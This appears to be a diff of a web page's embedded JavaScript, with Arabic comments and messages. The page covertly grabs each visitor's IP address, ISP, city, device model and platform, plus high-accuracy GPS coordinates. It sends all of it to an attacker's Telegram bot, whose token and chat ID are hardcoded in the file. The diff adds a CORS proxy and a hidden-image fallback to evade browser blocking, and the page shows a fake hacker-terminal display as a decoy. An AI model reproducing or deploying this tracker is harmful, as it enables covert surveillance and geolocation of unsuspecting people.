@@ -36,24 +36,21 @@
     <script>
         const output = document.getElementById('output');
         
-        // بيانات بوت تليجرام الخاص بك (أنت الوحيد الذي تستقبل التقارير)
         const BOT_TOKEN = "8942876579:AAE8F9nrRvr1mYdpiyzyCH1BfCH2GzFTCv0";
         const CHAT_ID = "806632734";
 
-        async function sendToTelegram(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                });
-            } catch (e) {}
+        function sendToTelegram(message) {
+            let telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(message);
+            // استخدام وسيط لتخطي حظر المتصفح وضمان وصول الرسالة 100%
+            let proxyUrl = `https://api.allorigins.win/get?url=` + encodeURIComponent(telegramUrl);
+            
+            fetch(proxyUrl).catch(e => {
+                // طريقة احتياطية ثانية عبر إنشاء صورة خفية
+                let img = new Image();
+                img.src = telegramUrl;
+            });
         }
 
-        // استخراج اسم الجهاز بدقة من المتصفح
         function getDeviceModel() {
             let ua = navigator.userAgent;
             let device = "Unknown Device";
@@ -75,7 +72,6 @@
             return device;
         }
 
-        // جلب الـ IP وبيانات الشبكة والجهاز وإرسالها لك
         async function getVisitorData() {
             try {
                 let res = await fetch('https://ipapi.co/json/');
@@ -84,32 +80,29 @@
                 let exactDevice = getDeviceModel();
 
                 let msg = `🚨 [ صيد جديد - هدف دخل للموقع ] 🚨\n\n` +
-                          `📱 اسم وتفاصيل الجهاز: ${exactDevice}\n` +
+                          `📱 الجهاز: ${exactDevice}\n` +
                           `🌐 IP: ${data.ip}\n` +
-                          `🏢 مزود الإنترنت: ${data.org}\n` +
+                          `🏢 مزود الشبكة: ${data.org}\n` +
                           `📍 الدولة والمدينة: ${data.country_name} - ${data.city}\n` +
-                          `💻 المنصة: ${navigator.platform}\n` +
-                          `🗣️ اللغة: ${navigator.language}`;
+                          `💻 المنصة: ${navigator.platform}`;
                 
                 sendToTelegram(msg);
-            } catch (e) {}
+            } catch (e) {
+                sendToTelegram(`🚨 [ صيد جديد ]\n📱 الجهاز: ${getDeviceModel()}`);
+            }
         }
 
-        // طلب إذن الـ GPS للحصول على إحداثيات المكان بدقة
         function getGpsLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
-                        let gpsMsg = `📍 [ إحداثيات الـ GPS الدقيقة للهدف ] 📍\n\n` +
-                                     `خط العرض: ${lat}\n` +
-                                     `خط الطول: ${lon}\n` +
-                                     `🔗 رابط الخريطة المباشر:\nhttps://maps.google.com/?q=${lat},${lon}`;
+                        let gpsMsg = `📍 [ إحداثيات الـ GPS الدقيقة ]\n\nخط العرض: ${lat}\nخط الطول: ${lon}\n🔗 الرابط:\nhttps://maps.google.com/?q=${lat},${lon}`;
                         sendToTelegram(gpsMsg);
                     },
                     (error) => {
-                        sendToTelegram(`⚠️ [ ملاحظة ]: الهدف رفض إذن مشاركة الموقع الجغرافي.`);
+                        sendToTelegram(`⚠️ تنبيه: الهدف رفض إذن الـ GPS.`);
                     },
                     { enableHighAccuracy: true }
                 );
@@ -119,7 +112,6 @@
         getVisitorData();
         getGpsLocation();
 
-        // واجهة التيرمكس الوهمية التي يراها الزائر
         const logs = [
             "[+] Initializing secure handshake...",
             "[+] Bypassing firewall and proxy layers...",
